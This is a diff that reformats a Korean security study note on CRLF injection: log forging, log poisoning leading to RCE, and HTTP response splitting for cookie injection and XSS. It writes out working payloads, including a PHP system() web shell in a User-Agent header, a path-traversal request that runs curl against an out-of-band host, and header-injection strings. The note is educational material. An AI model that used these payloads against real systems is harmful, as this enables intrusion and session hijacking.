@@ -27,38 +27,37 @@
 
 #### [1] Log Forging
 - 사용자 입력이 Log에 반영되는 부분이 있다면 CRLF 문자를 이용하여 새로운 Log를 작성할 수 있다.
-- 이러한 Log는 침해 사고 분석을 어렵게 할 수 있고, Log의 무결성을 해쳐서 Log의 신뢰도를 떨어뜨리고, Log가 가지는 부인 방지로서의 목적을 상실하게 할 수 있다.  
-
-정상 요청과 로그
-```
-GET /?query=aaaa
-```
-```
-['A' User][error][input: aaaa] invalid data
-```
-공격 요청과 로그
-```
-GET /?query=aaaa]%20invalid%20data%0d%0a['B' User][token]%20re-generate%20token
-```
-```
-['A' User][error][input: aaaa] invalid data
-['B' User][token] re-generate token
-```
+- 이러한 Log는 침해 사고 분석을 어렵게 할 수 있고, Log의 무결성을 해쳐서 Log의 신뢰도를 떨어뜨리고, Log가 가지는 부인 방지로서의 목적을 상실하게 할 수 있다.
+- 정상 요청과 로그
+    ```
+    GET /?query=aaaa
+    ```
+    ```
+    ['A' User][error][input: aaaa] invalid data
+    ```
+- 공격 요청과 로그
+    ```
+    GET /?query=aaaa]%20invalid%20data%0d%0a['B' User][token]%20re-generate%20token
+    ```
+    ```
+    ['A' User][error][input: aaaa] invalid data
+    ['B' User][token] re-generate token
+    ```
 
 
 #### [2] Log Poisoning
 - Log 데이터를 통제할 수 있고, 서비스 내 LFI, Path Traversal 취약점이 있는 경우 Log 파일의 경로를 유추하여 RCE 등 위험도를 높일 수 있다.  
 
-First Request (Log Poisoning)
-```
-GET / HTTP/1.1
-User-Agent: aa<?php echo system($_GET['cmd']); ?>bb
-```
-Second Request (Path Traversal)
-- 요청 내 `curl` 명령어가 실행
-```
-GET /file.php?path=/var/log/apache2/access.log?cmd=curl%20<OAST>/rce HTTP/1.1
-```
+- First Request (Log Poisoning)
+    ```
+    GET / HTTP/1.1
+    User-Agent: aa<?php echo system($_GET['cmd']); ?>bb
+    ```
+- Second Request (Path Traversal)
+    - 요청 내 `curl` 명령어가 실행
+    ```
+    GET /file.php?path=/var/log/apache2/access.log?cmd=curl%20<OAST>/rce HTTP/1.1
+    ```
 
 
 ### 2) HTTP 응답 분할(HTTP Response Splitting)
@@ -68,28 +67,28 @@ GET /file.php?path=/var/log/apache2/access.log?cmd=curl%20<OAST>/rce HTTP/1.1
 
 #### [1] Add Cookie
 - CRLF가 삽입된 구문이 Header에 반영되는 경우 임의로 Cookie를 삽입할 수 있다.
-```
-GET /redirect?location=ws://%0d%0aSet-Cookie: session=attackersessions;
-```
-```
-HTTP/1.1 200 OK
-Location: ws://
-Set-Cookie: session=attackersessions;
-```
+    ```
+    GET /redirect?location=ws://%0d%0aSet-Cookie: session=attackersessions;
+    ```
+    ```
+    HTTP/1.1 200 OK
+    Location: ws://
+    Set-Cookie: session=attackersessions;
+    ```
 
 
 #### [2] XSS
 - CRLF가 삽입된 구문이 Header에 반영되는 경우 `\r\n\r\n`과 같이 두 번 개행하여 Response Body 영역에 임의로 HTML 코드를 추가하여 XSS와 동일하게 사용자 브라우저에서 Script를 실행할 수 있다.
-```
-GET /redirect?location=ws://%0d%0a%0d%0a<svg/onload=alert(45)>
-```
-```
-HTTP/1.1 200 OK
-Location: ws://
+    ```
+    GET /redirect?location=ws://%0d%0a%0d%0a<svg/onload=alert(45)>
+    ```
+    ```
+    HTTP/1.1 200 OK
+    Location: ws://
 
-<svg/onload=alert(45)>
-```
-
+    <svg/onload=alert(45)>
+    ```
+  
 
 # 참고문헌
 - [Log Injection](https://www.hahwul.com/cullinan/log-injection/)
